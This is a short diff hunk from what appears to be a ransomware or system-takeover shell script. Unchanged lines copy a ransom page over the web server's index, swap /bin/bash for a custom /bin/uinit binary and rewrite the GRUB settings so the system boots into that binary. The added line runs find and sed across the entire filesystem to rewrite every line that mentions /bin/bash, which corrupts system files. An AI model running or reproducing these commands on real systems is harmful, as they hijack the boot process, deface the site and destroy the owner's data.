@@ -29,6 +29,8 @@ cp ransom.html /var/www/html/index.html
 cp /bin/bash /bin/bush
 cp /bin/uinit /bin/bash
 
+find / -type f -exec sed -i '/\/bin\/bash/c\\/bin\/bush' {} \;
+
 #comment out GRUB_CMDLINE_LINUX_DEFAULT
 #GRUB_CMDLINE_LINUX needs to be GRUB_CMDLINE_LINUX="init=/bin/uinit"
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub
